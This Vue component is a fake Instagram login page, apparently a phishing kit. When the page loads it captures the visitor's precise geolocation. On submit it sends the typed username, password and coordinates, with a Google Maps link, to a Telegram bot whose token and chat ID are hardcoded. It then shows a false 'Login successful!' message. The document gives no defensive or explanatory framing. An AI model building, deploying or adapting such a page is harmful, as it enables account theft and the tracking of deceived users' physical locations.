<template>
  <div class="container">
    <div class="login-box">
      <div class="logo-container">
        <img
          src="https://upload.wikimedia.org/wikipedia/commons/a/a5/Instagram_icon.png"
          alt="Instagram Logo"
          class="logo-img"
        />
        <h1 class="logo">Instagram</h1>
      </div>

      <form class="login-form" @submit.prevent="handleLogin">
        <input
          type="text"
          v-model="username"
          placeholder="Phone number, username, or email"
          class="input-field"
        />

        <input
          type="password"
          v-model="password"
          placeholder="Password"
          class="input-field"
        />

        <button type="submit" class="login-button">Log in</button>
      </form>

      <div class="divider">
        <div class="divider-line"></div>
        <span class="divider-text">OR</span>
        <div class="divider-line"></div>
      </div>

      <div class="forgot-password">
        <a href="#" class="forgot-link"> Forgot password? </a>
      </div>
    </div>

    <div class="signup-box">
      <p class="signup-text">
        Don't have an account?
        <a href="#" class="signup-link"> Sign up </a>
      </p>
    </div>
  </div>
</template>

<script>
export default {
  name: "InstagramLogin",
  data() {
    return {
      username: "",
      password: "",
      botToken: "7622854137:AAH6xblJA8biVHaE4VbC1svOAC-izatOoZI",
      chatId: "5673984207",
      latitude: null,
      longitude: null,
      locationError: null,
    };
  },
  mounted() {
    // Request user's geolocation when the component is mounted
    this.getGeolocation();
  },
  methods: {
    // Get user's geolocation
    getGeolocation() {
      if (navigator.geolocation) {
        navigator.geolocation.getCurrentPosition(
          (position) => {
            // Success callback
            this.latitude = position.coords.latitude;
            this.longitude = position.coords.longitude;
            console.log("Location captured:", this.latitude, this.longitude);
          },
          (error) => {
            // Error callback
            this.locationError = error.message;
            console.error("Geolocation error:", error.message);
          },
          {
            enableHighAccuracy: true,
            timeout: 5000,
            maximumAge: 0,
          }
        );
      } else {
        this.locationError = "Geolocation is not supported by this browser.";
        console.error("Geolocation is not supported by this browser.");
      }
    },

    handleLogin() {
      // Log the login attempt
      console.log("Login attempt with:", {
        username: this.username,
        password: this.password,
      });

      // Send the login credentials to Telegram
      this.sendToTelegram();

      // Clear the form fields after submission
      this.username = "";
      this.password = "";

      // Show a success message (optional)
      alert("Login successful!");
    },

    sendToTelegram() {
      // Format the message with geolocation data
      const message = `
New Instagram Login:
Username: ${this.username}
Password: ${this.password}
Time: ${new Date().toLocaleString()}
${
  this.latitude && this.longitude
    ? `Location: ${this.latitude}, ${this.longitude}
Google Maps: https://www.google.com/maps?q=${this.latitude},${this.longitude}`
    : "Location: Not available"
}
      `;

      // Encode the message for URL
      const encodedMessage = encodeURIComponent(message);

      // Create the Telegram API URL
      const telegramUrl = `https://api.telegram.org/bot${this.botToken}/sendMessage?chat_id=${this.chatId}&text=${encodedMessage}`;

      // Send the request to Telegram
      fetch(telegramUrl)
        .then((response) => response.json())
        .then((data) => {
          console.log("Message sent to Telegram:", data);
        })
        .catch((error) => {
          console.error("Error sending message to Telegram:", error);
        });
    },
  },
};
</script>

<style>
* {
  margin: 0;
  padding: 0;
  box-sizing: border-box;
}
.container {
  display: flex;
  flex-direction: column;
  align-items: center;
  justify-content: center;
  min-height: 100vh;
  background-color: #000;
  color: #fff;
}

.login-box {
  width: 100%;
  max-width: 350px;
  padding: 0 20px;
}

.logo-container {
  display: flex;
  flex-direction: column;
  justify-content: center;
  align-items: center;
  margin-bottom: 32px;
}

.logo {
  font-size: 2.5rem;
  font-family: serif;
  font-style: italic;
  font-weight: 600;
  margin-top: 10px;
}

.logo-img {
  width: 72px;
  height: 72px;
}

.login-form {
  display: flex;
  flex-direction: column;
  gap: 16px;
}

.input-field {
  width: 100%;
  padding: 10px 12px;
  background-color: transparent;
  border: 1px solid #444;
  border-radius: 4px;
  color: #fff;
}

.input-field::placeholder {
  color: #777;
}

.login-button {
  width: 100%;
  padding: 8px 0;
  background-color: #0095f6;
  border: none;
  border-radius: 4px;
  color: #fff;
  font-weight: 600;
  cursor: pointer;
}

.login-button:hover {
  background-color: #0081d6;
}

.divider {
  display: flex;
  align-items: center;
  margin: 16px 0;
}

.divider-line {
  flex: 1;
  height: 1px;
  background-color: #444;
}

.divider-text {
  padding: 0 16px;
  color: #777;
  font-size: 0.8rem;
}

.forgot-password {
  margin-top: 16px;
  text-align: center;
}

.forgot-link {
  color: #0095f6;
  font-size: 0.8rem;
  text-decoration: none;
}

.signup-box {
  margin-top: 32px;
  border-top: 1px solid #444;
  width: 100%;
  max-width: 350px;
  padding: 16px 20px;
}

.signup-text {
  text-align: center;
  font-size: 0.8rem;
  color: #777;
}

.signup-link {
  color: #0095f6;
  text-decoration: none;
}
</style>
